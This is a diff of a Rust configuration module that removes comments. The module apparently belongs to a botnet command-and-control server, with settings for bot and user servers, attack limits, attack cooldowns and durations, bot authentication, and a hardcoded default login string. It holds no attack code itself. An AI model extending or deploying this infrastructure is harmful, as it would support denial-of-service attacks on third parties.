@@ -1,76 +1,53 @@
 use serde::{Deserialize, Serialize};
 use std::path::Path;
 use std::fs;
-
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct Config {
     #[serde(default = "default_user_server_ip")]
     pub user_server_ip: String,
-    
     #[serde(default = "default_bot_server_ip")]
     pub bot_server_ip: String,
-    
     #[serde(default = "default_user_server_port")]
     pub user_server_port: u16,
-    
     #[serde(default = "default_bot_server_port")]
     pub bot_server_port: u16,
-    
     #[serde(default = "default_max_attacks")]
     pub max_attacks: usize,
-    
     #[serde(default = "default_max_bot_connections")]
     pub max_bot_connections: usize,
-    
     #[serde(default = "default_max_user_connections")]
     pub max_user_connections: usize,
-    
     #[serde(default = "default_session_timeout")]
     pub session_timeout_secs: u64,
-    
     #[serde(default = "default_enable_tls")]
     pub enable_tls: bool,
-    
     #[serde(default = "default_cert_path")]
     pub cert_path: String,
-    
     #[serde(default = "default_key_path")]
     pub key_path: String,
-    
     #[serde(default = "default_log_level")]
     pub log_level: String,
-    
     #[serde(default = "default_deployment_mode")]
-    pub deployment_mode: String,  // "local" or "public"
-    
+    pub deployment_mode: String,  
     #[serde(default = "default_attack_cooldown_secs")]
-    pub attack_cooldown_secs: u64,  // Cooldown between attacks per user
-    
+    pub attack_cooldown_secs: u64,  
     #[serde(default = "default_max_attack_duration_secs")]
     pub max_attack_duration_secs: u64,
-
     #[serde(default = "default_login_magic_string")]
     pub login_magic_string: String,
-
     #[serde(default = "default_handshake_timeout_secs")]
     pub handshake_timeout_secs: u64,
-
     #[serde(default = "default_bot_auth_timeout_secs")]
     pub bot_auth_timeout_secs: u64,
-
     #[serde(default = "default_strict_tls")]
     pub strict_tls: bool,
-
     #[serde(default = "default_rate_limit_per_minute")]
     pub rate_limit_per_minute: u32,
-
     #[serde(default = "default_terminal_width")]
     pub terminal_width: usize,
-
     #[serde(default = "default_terminal_height")]
     pub terminal_height: usize,
 }
-
 fn default_user_server_ip() -> String { "0.0.0.0".to_string() }
 fn default_bot_server_ip() -> String { "0.0.0.0".to_string() }
 fn default_user_server_port() -> u16 { 1420 }
@@ -84,8 +61,8 @@ fn default_cert_path() -> String { "cert.pem".to_string() }
 fn default_key_path() -> String { "key.pem".to_string() }
 fn default_log_level() -> String { "info".to_string() }
 fn default_deployment_mode() -> String { "local".to_string() }
-fn default_attack_cooldown_secs() -> u64 { 60 }  // 1 minute cooldown
-fn default_max_attack_duration_secs() -> u64 { 300 } // 5 minutes
+fn default_attack_cooldown_secs() -> u64 { 60 }  
+fn default_max_attack_duration_secs() -> u64 { 300 } 
 fn default_login_magic_string() -> String { "loginforme".to_string() }
 fn default_handshake_timeout_secs() -> u64 { 10 }
 fn default_bot_auth_timeout_secs() -> u64 { 5 }
@@ -93,7 +70,6 @@ fn default_strict_tls() -> bool { false }
 fn default_rate_limit_per_minute() -> u32 { 10 }
 fn default_terminal_width() -> usize { 90 }
 fn default_terminal_height() -> usize { 32 }
-
 impl Default for Config {
     fn default() -> Self {
         Self {
@@ -122,16 +98,13 @@ impl Default for Config {
         }
     }
 }
-
 impl Config {
     pub fn load() -> Self {
-        // Try TOML config files first (in priority order)
         let toml_paths = vec![
             "config/server.toml",
             "server.toml",
             "config.toml",
         ];
-        
         for path in toml_paths {
             if Path::new(path).exists() {
                 match Self::from_toml_file(path) {
@@ -146,8 +119,6 @@ impl Config {
                 }
             }
         }
-        
-        // Try JSON config files (backward compatibility)
         let json_paths = vec!["config/config.json", "config.json"];
         for path in json_paths {
             if Path::new(path).exists() {
@@ -157,34 +128,21 @@ impl Config {
                 }
             }
         }
-        
-        // Fall back to environment variables and defaults
         tracing::warn!("No config file found, using environment variables and defaults");
         let config = Self::from_env();
-        
-        // Auto-generate default config file if it doesn't exist
         if let Err(e) = config.save() {
             tracing::warn!("Failed to save default configuration: {}", e);
         } else {
             tracing::info!("Created default configuration at config/server.toml");
         }
-        
         config
     }
-    
     fn from_toml_file(path: &str) -> Result<Self, Box<dyn std::error::Error>> {
         let contents = fs::read_to_string(path)?;
-        
-        // Parse TOML with nested structure support
         let value: toml::Value = toml::from_str(&contents)?;
-        
-        // Extract server section if it exists
         let server_section = value.get("server").unwrap_or(&value);
         let limits_section = value.get("limits");
-        
         let mut config = Config::default();
-        
-        // Parse server section
         if let Some(port) = server_section.get("user_port").and_then(|v| v.as_integer()) {
             config.user_server_port = port as u16;
         }
@@ -215,8 +173,6 @@ impl Config {
         if let Some(height) = server_section.get("terminal_height").and_then(|v| v.as_integer()) {
             config.terminal_height = height as usize;
         }
-        
-        // Parse limits section if it exists
         if let Some(limits) = limits_section {
             if let Some(max) = limits.get("max_bots").and_then(|v| v.as_integer()) {
                 config.max_bot_connections = max as usize;
@@ -240,13 +196,10 @@ impl Config {
                 config.rate_limit_per_minute = rate as u32;
             }
         }
-        
         Ok(config)
     }
-    
     fn from_env() -> Self {
         use std::env;
-        
         Self {
             user_server_ip: env::var("USER_SERVER_IP").unwrap_or_else(|_| default_user_server_ip()),
             bot_server_ip: env::var("BOT_SERVER_IP").unwrap_or_else(|_| default_bot_server_ip()),
@@ -317,14 +270,12 @@ impl Config {
                 .unwrap_or_else(default_terminal_height),
         }
     }
-    
     fn from_json_file(path: &str) -> Result<Self, std::io::Error> {
         let contents = std::fs::read_to_string(path)?;
         serde_json::from_str(&contents).map_err(|e| {
             std::io::Error::new(std::io::ErrorKind::InvalidData, e)
         })
     }
-    
     pub fn validate(&self) -> Result<(), String> {
         if self.user_server_port == 0 {
             return Err("user_server_port must be > 0".to_string());
@@ -341,8 +292,6 @@ impl Config {
         if self.max_user_connections == 0 {
             return Err("max_user_connections must be > 0".to_string());
         }
-        
-        // CRITICAL: Enforce TLS for public deployment
         if self.deployment_mode == "public" {
             if !self.enable_tls {
                 return Err(
@@ -351,12 +300,7 @@ impl Config {
                     "or set enable_tls=true and configure cert_path/key_path for public deployment."
                 );
             }
-            
-            // In public mode, we must ensure certificates exist or strict_tls is handled
             if !Path::new(&self.cert_path).exists() || !Path::new(&self.key_path).exists() {
-                // If strict_tls is true (default for public should be considered), we fail.
-                // But we also want to prevent auto-generation in public mode unless explicitly allowed?
-                // The requirement says: "In public deployment mode, the server should refuse to start if valid certificates are not provided, rather than generating insecure ones."
                 return Err(format!(
                     "SECURITY ERROR: TLS certificates not found at {} / {}.\n", self.cert_path, self.key_path) +
                     "In public mode, you must provide valid CA-signed certificates.\n" +
@@ -364,32 +308,19 @@ impl Config {
                 );
             }
         }
-
         if !self.enable_tls {
             if self.deployment_mode == "public" {
                 return Err("TLS is required for public deployment mode.".to_string());
             }
             tracing::warn!("TLS is disabled. This is not recommended for production.");
         }
-        
         Ok(())
     }
-
     pub fn save(&self) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-        // Prefer saving to server.toml
         let path = "config/server.toml";
-        
-        // Create config directory if it doesn't exist
         if let Some(parent) = std::path::Path::new(path).parent() {
             std::fs::create_dir_all(parent)?;
         }
-
-        // We need to serialize to TOML. 
-        // Since our Config struct is flat but the TOML has sections (server, limits),
-        // we should reconstruct the structure or just save as flat TOML if the parser supports it.
-        // However, the parser expects specific sections.
-        // Let's create a helper struct for serialization that matches the TOML structure.
-        
         #[derive(Serialize)]
         struct ServerConfig<'a> {
             user_port: u16,
@@ -403,7 +334,6 @@ impl Config {
             terminal_width: usize,
             terminal_height: usize,
         }
-        
         #[derive(Serialize)]
         struct LimitsConfig {
             max_bots: usize,
@@ -414,13 +344,11 @@ impl Config {
             bot_auth_timeout_secs: u64,
             rate_limit_per_minute: u32,
         }
-        
         #[derive(Serialize)]
         struct TomlConfig<'a> {
             server: ServerConfig<'a>,
             limits: LimitsConfig,
         }
-        
         let toml_config = TomlConfig {
             server: ServerConfig {
                 user_port: self.user_server_port,
@@ -444,10 +372,8 @@ impl Config {
                 rate_limit_per_minute: self.rate_limit_per_minute,
             },
         };
-        
         let toml_string = toml::to_string_pretty(&toml_config)?;
         std::fs::write(path, toml_string)?;
-        
         Ok(())
     }
 }
